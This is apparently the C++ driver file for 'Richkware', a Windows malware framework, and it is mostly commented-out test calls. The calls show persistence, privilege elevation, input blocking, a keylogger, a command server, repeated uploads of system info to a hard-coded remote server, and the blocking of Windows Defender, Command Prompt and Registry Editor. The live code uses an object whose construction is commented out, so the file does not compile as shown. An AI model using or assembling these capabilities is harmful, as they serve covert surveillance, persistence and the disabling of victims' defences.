
#include <iostream>

#include "richkware.h"

//void print_session(Richkware richkware);

//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
int main() {

    //Richkware richkware("Richk","richktest");
    //Richkware richkware("Richk","richktest","192.168.99.100", "8080");
    std::cout << richkware.encryptionKey;


    /*
    Richkware richkware("Richk","richktest","192.168.99.100", "8080",  "richk@richk.me");
    //richkware.network.server.Start("6000");
    richkware.network.server.Start("6000",true);
    while (true) {
        richkware.network.UploadInfoToRMS("192.168.99.100", "8080", "richk@richk.me");
        Sleep(5000);
    }
    */

    /*richkware.CheckPersistance();

    richkware.Persistance();

    richkware.CheckPersistance();
    */

    /*
    richkware.systemStorage.SaveValueToFile("ciao");
    std::string s = richkware.systemStorage.LoadValueFromFile();
    MessageBox(NULL, s.c_str(), " ", 0);
    */

    /*	if (!IsRunAsAdministrator()) {
     ElevateNow();
     }*/

    //BlockInput(true);
    //richkware.Persistance();
    //S(false);
    //-------------------------------------------------

    //std::string s = EncryptDecrypt("ls---", "Z");
    //MessageBox(NULL, s.c_str(), "", 0);
    // prova "ls---" in XOR a "A" diventa "6)www"

    //richkware.StartServer("8000","Z");
    //richkware.StartServer("8000");

    //const char* res = richkware.RawRequest("95.243.27.171","80", "GET / HTTP/1.1\r\nHost: 95.243.27.171S\r\nConnection: close\r\n\r\n");
    //std::cout << res;
    /*
     std::cout << richkware.IsAdmin();
     if(!richkware.IsAdmin())
     richkware.RequestAdminPrivileges();

     // lancia un thread quindi potrebbe non essere sincronizzato al momento della stampa3
     std::cout << richkware.IsAdmin();

     -------------------------------------------------*/

    richkware.session.SaveInfo("first", "richkrichk");
    std::cout << (("---+----:" + richkware.session.FindInfo("first") + ":-------+----").c_str());


    /*richkware.session.SaveInfo("2", "SecondaInfo");
    richkware.session.SaveInfo("3", "TerzaInfo");
    OutputDebugString(("---+----:" + richkware.session.FindInfo("ciao") + ":-------+----").c_str());
    OutputDebugString(("---+----:" + richkware.session.FindInfo("2") + ":-------+----").c_str());
    OutputDebugString(("---+----:" + richkware.session.FindInfo("3") + ":-------+----").c_str());
    std::cout <<(("---+----:" + richkware.session.FindInfo("ciao") + ":-------+----").c_str());
    std::cout <<(("---+----:" + richkware.session.FindInfo("2") + ":-------+----").c_str());
    std::cout <<(("---+----:" + richkware.session.FindInfo("3") + ":-------+----").c_str());
    richkware.session.RemoveInfo("2");
    richkware.session.RemoveInfo("3");
    */

    /*----------------------------------------------------

    richkware.session.SaveInfo("prima", "ciao");
    std::string s = richkware.session.FindInfo("prima");
    std::cout << s;

    -------------------------------------------------*/
/*
	   while(true){

		   richkware.blockApps.start();
		   std::cout << "blocked";

		   richkware.blockApps.dangerousApps.add("Windows Defender");
		   richkware.blockApps.dangerousApps.add("Command Prompt");
		   richkware.blockApps.dangerousApps.add("Registry Editor");

		   Sleep(5000);

		   richkware.blockApps.stop();
	   }
*/ //-------------------------------------------------

    //richkware.Keylogger("prova.txt");

    //------------------------------------------------------
    /*
    if (richkware.CheckPersistance()) {
        MessageBox(NULL, "TRUE", " ", 0);
        OutputDebugString("Richk--------- TRUE");
    }
    else {
        MessageBox(NULL, "FALSE", " ", 0);
        OutputDebugString("Richk--------- FALSE");
    }

    Sleep(5000);
    richkware.Persistance();
    richkware.session["terzo"] = "nova";

    richkware.SaveSession("555");

    if (richkware.CheckExistance()) {
        MessageBox(NULL, "TRUE", " ", 0);
        OutputDebugString("Richk--------- TRUE");
    }
    else {
        MessageBox(NULL, "FALSE", " ", 0);
        OutputDebugString("Richk--------- FALSE");
    }
    */
    //--------------------------------------------------------

    return 0;

}

/*void print_session(Richkware richkware) {
	std::string s;
	for (std::map<std::string, std::string>::iterator it = richkware.session.begin();
		it != richkware.session.end(); ++it) {
		std::cout << it->first << "," << it->second << "|" << std::endl;
		s.append(it->first);
		s.append(",");
		s.append(it->second);
		s.append("|");
	}
	std::cout << "\n\n";
	MessageBox(NULL, s.c_str(), "", 0);
	s.clear();
}*/

